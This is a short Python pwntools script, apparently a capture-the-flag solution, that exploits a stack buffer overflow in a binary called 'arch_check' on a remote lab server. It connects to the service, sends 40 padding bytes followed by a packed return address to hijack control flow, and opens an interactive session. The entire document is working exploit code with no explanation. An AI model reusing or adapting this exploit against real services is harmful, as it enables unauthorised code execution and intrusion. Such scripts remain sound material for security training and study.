from pwn import *
# r = process('./arch_check')
r = remote('up.zoolab.org','30001')
r.recvuntil('you using?')
target_address =  p64(0x4011dd)
r.sendline(b'A' *40 + target_address)
r.interactive()
